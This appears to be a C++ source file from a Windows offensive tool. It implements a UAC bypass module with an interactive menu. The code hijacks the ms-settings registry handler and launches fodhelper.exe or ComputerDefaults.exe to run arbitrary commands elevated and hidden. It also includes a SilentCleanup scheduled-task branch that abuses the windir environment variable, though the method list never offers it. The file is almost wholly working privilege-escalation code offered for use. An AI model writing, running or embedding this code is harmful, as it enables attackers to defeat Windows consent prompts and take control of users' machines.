#include "uac_bypass_module.h"

#include <iostream>
#include <windows.h>
#include <sstream>
#include <conio.h>

std::vector<std::string> UacBypassModule::getCommands() const {
    return { "uac-bypass", "uac-cmd", "uac-run" };
}

std::vector<BypassMethod> UacBypassModule::getMethods() {
    return {
        { "Fodhelper",
          "HKCU\\ms-settings + fodhelper.exe  (Win10/11)",
          "Software\\Classes\\ms-settings\\Shell\\Open\\command",
          "C:\\Windows\\System32\\fodhelper.exe" },
        { "ComputerDefaults",
          "HKCU\\ms-settings + ComputerDefaults.exe  (Win10/11)",
          "Software\\Classes\\ms-settings\\Shell\\Open\\command",
          "C:\\Windows\\System32\\ComputerDefaults.exe" }
    };
}

bool UacBypassModule::execute(const std::string& cmd, const std::vector<std::string>& args) {
    if (cmd == "uac-bypass") {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        std::string command = std::string("\"") + exePath + "\"";
        showMethodMenu(command, true);
        return true;
    }

    if (cmd == "uac-cmd") {
        if (args.empty()) {
            std::cout << "Usage: uac-cmd <command>\n";
            std::cout << "  Example: uac-cmd whoami\n";
            return true;
        }
        std::string command = "cmd.exe /c " + args[0];
        for (size_t i = 1; i < args.size(); ++i)
            command += " " + args[i];
        showMethodMenu(command, false);
        return true;
    }

    if (cmd == "uac-run") {
        if (args.empty()) {
            std::cout << "Usage: uac-run <program> [args...]\n";
            std::cout << "  Example: uac-run notepad.exe\n";
            return true;
        }
        std::string command = "\"" + args[0] + "\"";
        for (size_t i = 1; i < args.size(); ++i)
            command += " \"" + args[i] + "\"";
        showMethodMenu(command, false);
        return true;
    }

    return false;
}

// ======== interactive method selection menu ========

static void setCursorPos(int x, int y) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD coord = { (SHORT)x, (SHORT)y };
    SetConsoleCursorPosition(hOut, coord);
}

static int getMenuStartY() {
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
    return csbi.dwCursorPosition.Y;
}

void UacBypassModule::showMethodMenu(const std::string& command, bool exitAfter) {
    auto methods = getMethods();
    int methodCount = (int)methods.size();
    int selected = 0;

    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    DWORD prevMode;
    GetConsoleMode(hIn, &prevMode);
    SetConsoleMode(hIn, ENABLE_EXTENDED_FLAGS | prevMode);

    std::cout << "\n";
    int menuStart = getMenuStartY();

    std::cout << "  \x1b[1;37mUAC Bypass Methods\x1b[0m\n";
    std::cout << "  \x1b[90m" << std::string(50, '-') << "\x1b[0m\n";

    int listStart = getMenuStartY();

    std::cout << "\n  \x1b[90m" << std::string(50, '-') << "\x1b[0m\n";
    std::cout << "  \x1b[90m[Up/Down] select  [Enter] execute  [Esc] cancel\x1b[0m\n";

    int descLine = getMenuStartY() + 1;
    auto drawMenu = [&]() {
        int y = listStart;
        for (int i = 0; i < methodCount; ++i) {
            setCursorPos(0, y);
            std::string prefix = (i == selected) ? "  \x1b[44m\x1b[37m> " : "    ";
            std::string nameColor = (i == selected) ? "\x1b[44m\x1b[1;37m" : "\x1b[32m";
            std::string descColor = (i == selected) ? "\x1b[44m\x1b[37m" : "\x1b[90m";
            std::string suffix = (i == selected) ? " \x1b[0m" : "\x1b[0m";
            std::cout << prefix << nameColor << methods[i].name << suffix
                      << descColor << "  " << methods[i].desc << "\x1b[0m"
                      << std::string(40, ' ');
            ++y;
        }
        setCursorPos(0, descLine);
        std::cout << "  \x1b[96m" << methods[selected].desc << "\x1b[0m" << std::string(40, ' ');
    };

    drawMenu();

    while (true) {
        int ch = _getch();
        if (ch == 224) {
            ch = _getch();
            if (ch == 72 && selected > 0) {
                selected--;
                drawMenu();
            } else if (ch == 80 && selected < methodCount - 1) {
                selected++;
                drawMenu();
            }
        } else if (ch == 13) {
            break;
        } else if (ch == 27) {
            // cleanup menu
            int y = menuStart;
            for (int i = 0; i < methodCount + 6; ++i) {
                setCursorPos(0, y + i);
                std::cout << std::string(80, ' ');
            }
            setCursorPos(0, menuStart);
            std::cout << "[*] Canceled.\n";
            SetConsoleMode(hIn, prevMode);
            return;
        }
    }

    SetConsoleMode(hIn, prevMode);
    std::cout << "\n";
    bypassUac(methods[selected], command, exitAfter);
}

// ======== bypass logic ========

bool UacBypassModule::bypassUac(const BypassMethod& method, const std::string& command, bool exitAfter) {
    if (std::string(method.name) == "SilentCleanup") {
        std::cout << "[*] SilentCleanup method: scheduled task + environment variable...\n";

        const char* envKey = "Environment";
        HKEY hEnv;
        LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, envKey, 0, NULL,
            REG_OPTION_VOLATILE, KEY_WRITE | KEY_READ, NULL, &hEnv, NULL);
        if (result != ERROR_SUCCESS) {
            std::cerr << "[-] Failed to open Environment key. Error: " << result << "\n";
            return true;
        }

        std::string payload = "cmd.exe /c " + command + " & exit";
        result = RegSetValueExA(hEnv, "windir", 0, REG_SZ,
            (const BYTE*)payload.c_str(), static_cast<DWORD>(payload.size() + 1));
        if (result != ERROR_SUCCESS) {
            std::cerr << "[-] Failed to set windir. Error: " << result << "\n";
            RegCloseKey(hEnv);
            return true;
        }
        RegCloseKey(hEnv);

        std::cout << "[+] Environment variable set.\n";
        std::cout << "[*] Triggering SilentCleanup scheduled task...\n";

        SHELLEXECUTEINFOA sei = {};
        sei.cbSize = sizeof(sei);
        sei.lpVerb = "open";
        sei.lpFile = "schtasks.exe";
        sei.lpParameters = "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I";
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;

        if (ShellExecuteExA(&sei)) {
            if (sei.hProcess) {
                WaitForSingleObject(sei.hProcess, 5000);
                CloseHandle(sei.hProcess);
            }
            std::cout << "[+] SilentCleanup bypass triggered.\n";
        } else {
            std::cerr << "[-] Failed to trigger scheduled task. Error: " << GetLastError() << "\n";
        }

        std::cout << "[*] Cleaning up...\n";
        RegDeleteValueA(HKEY_CURRENT_USER, "windir");

        std::cout << "[+] Done.\n";
        if (exitAfter) exit(0);
        return true;
    }

    // Standard COM hijack method
    std::cout << "[*] " << method.name << " method\n";
    std::cout << "[*] Setting up registry: HKCU\\" << method.regPath << "\n";

    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, method.regPath, 0, NULL,
        REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) {
        std::cerr << "[-] Failed to create registry key. Error: " << result << "\n";
        return true;
    }

    result = RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
        (const BYTE*)"", 1);
    if (result != ERROR_SUCCESS) {
        std::cerr << "[-] Failed to set DelegateExecute. Error: " << result << "\n";
        RegCloseKey(hKey);
        return true;
    }

    result = RegSetValueExA(hKey, "", 0, REG_SZ,
        (const BYTE*)command.c_str(), static_cast<DWORD>(command.size() + 1));
    if (result != ERROR_SUCCESS) {
        std::cerr << "[-] Failed to set default value. Error: " << result << "\n";
        RegCloseKey(hKey);
        return true;
    }

    RegCloseKey(hKey);

    std::cout << "[+] Registry key set.\n";
    std::cout << "[*] Triggering " << method.triggerExe << "...\n";

    SHELLEXECUTEINFOA sei = {};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "open";
    sei.lpFile = method.triggerExe;
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;

    if (ShellExecuteExA(&sei)) {
        if (sei.hProcess) {
            WaitForSingleObject(sei.hProcess, 3000);
            CloseHandle(sei.hProcess);
        }
        std::cout << "[+] UAC bypass triggered successfully.\n";
    } else {
        std::cerr << "[-] Failed to launch " << method.triggerExe
                  << ". Error: " << GetLastError() << "\n";
    }

    std::cout << "[*] Cleaning up registry...\n";
    RegDeleteKeyA(HKEY_CURRENT_USER, method.regPath);

    std::cout << "[+] Done.\n";
    if (exitAfter) exit(0);
    return true;
}